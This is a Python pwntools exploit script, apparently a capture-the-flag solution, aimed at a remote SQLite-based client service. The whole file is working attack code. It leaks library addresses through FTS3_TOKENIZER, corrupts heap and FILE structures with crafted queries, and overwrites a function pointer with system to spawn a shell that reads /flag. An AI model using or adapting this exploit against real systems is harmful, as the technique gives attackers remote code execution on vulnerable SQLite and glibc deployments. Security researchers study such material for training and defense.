# -*- coding: future_fstrings -*-

from pwn import *

IP, PORT = '35.200.92.72', 10007
#IP, PORT = 'localhost', 10008
DEBUG = False

context.arch = 'x86_64'
#context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.aslr = True

sq3 = ELF('./remote/libsqlite3.so.0.8.6')
libc = ELF('./remote/libc-2.23.so')

def spawn():
    global p
    try:
        p.close()
    except:
        pass
    if DEBUG:
        p = gdb.debug(['./remote/ld-2.23.so', './client'], env={'LD_LIBRARY_PATH': './remote'}, gdbscript="handle SIGALRM ignore\n")
    else:
        p = remote(IP, PORT)


def menu(sel):
    p.sendlineafter('> ', str(sel))

def query(qs):
    menu(2)
    p.sendlineafter('query> ', qs)
    p.recvuntil('now execute it:')
    p.recvlines(2)
    res = []
    while p.recvline(False) == '[ Query result ]':
        res.append(p.recvline(False))
    return res

def show(idx):
    menu(3)
    p.sendlineafter('query index> ', str(idx))
    if 'SQL Error' in p.recvline():
        return None
    else:
        return p.recvuntil('\n\n').split('\n')

def remove():
    menu(4)
    return 'SQL Error' not in p.recvline()

def rev(val):
    return u64(p64(val, endian='le'), endian='be')

def hexdec(hexstr):
    return rev(int(hexstr, 16))

def blob(val):
    return "x'{:016x}'".format(rev(val & ((1 << 64) - 1)))


while True:
    try:
        spawn()

        leak = hexdec(query(f"select hex(FTS3_TOKENIZER('simple'));")[0])
        sq3.address = leak - 0x2d0ce0
        assert sq3.address & 0xfff == 0
        log.success('sqlite3: {:016X}'.format(sq3.address))
        libc.address = sq3.address - 0x3ca000
        log.success('libc:    {:016X}'.format(libc.address))

        val = 0x0137dead0000
        query(f"PRAGMA soft_heap_limit={val};")

        main_arena = libc.sym['__malloc_hook'] + 0x10
        fastbinsY = main_arena + 0x8

        log.info   ('fastbinsY: {:016X}'.format(fastbinsY))

        leak = hexdec(query(f"select hex(block({blob(fastbinsY)}));")[0])
        heap_base = leak - 0x4130 - (0x1070 if DEBUG else 0)
        assert heap_base & 0xfff == 0
        log.success('heap:    {:016X}'.format(heap_base))

        buf = heap_base + 0x3370 + (0x1070 if DEBUG else 0)
        log.info   ('buf:     {:016X}'.format(buf))

        fp = buf + 0x1448
        fptr_stage = fp + 0x40
        log.info   ('fp:      {:016X}'.format(fp))
        log.info   ('fptr_stg:{:016X}'.format(fptr_stage))

        # Need to brute-force several times
        query('Z'*0x3e+'\0\0')
        query('Z'*0x3e+'\0\0')
        query('A'*0x20+p32(0xffffffff)+'AAAA'+'A'*0x10+p64(sq3.address + 0x2D4528 - 0x18))
        query('A'*0x30+'/bin/sh;'+p64(next(sq3.search("create\0"))))
        query('Z'*0x3e+'\0\0')
        query('A'*8+'B'*8+'A'*0x2e+'\0\0')

        val = libc.sym['system']
        query(f"PRAGMA soft_heap_limit={val};")

        """
        0x3e:
        0x7ffff8003ab8
        0x7ffff8003a68
        0x7ffff80038c8 <- !
        0x7ffff80037f8 <- !
        0x7ffff8003718
        0x7ffff8003848 <- !

        0x08 <- 0x7ffff8003830 = 0x7ffff80037f8 + 0x38
        0x20 <- 0x7ffff8003848 = 0x7ffff8003848 + 0
        0x28 <- 0x7ffff8003850 = 0x7ffff8003848 + 0x8
        0xc0 <- 0x7ffff80038e8 = 0x7ffff80038c8 + 0x20
        0xd8 <- 0x7ffff8003900 = 0x7ffff80038c8 + 0x38, fptr stager
        """

        query(f"select block({blob(buf + 0x48)});".ljust(0x38, '\x00') + p64(0) + p64(0) + p64(0) + p64(next(sq3.search("create\0"))) + p64(0))

        query(f"".ljust(0x38, '\x00') + p64(0) + p64(0) + p64(0) + p64(next(sq3.search("create\0"))) + p64(libc.sym['_IO_2_1_stdin_']+0x58))

        query(f"select block({blob(fp)});")

        p.sendlineafter('> ', '5')

        p.sendline('cat /flag')
        print(p.recvline())

        break
    except EOFError:
        log.warning('Fail, retry')
        continue
    except KeyboardInterrupt:
        break
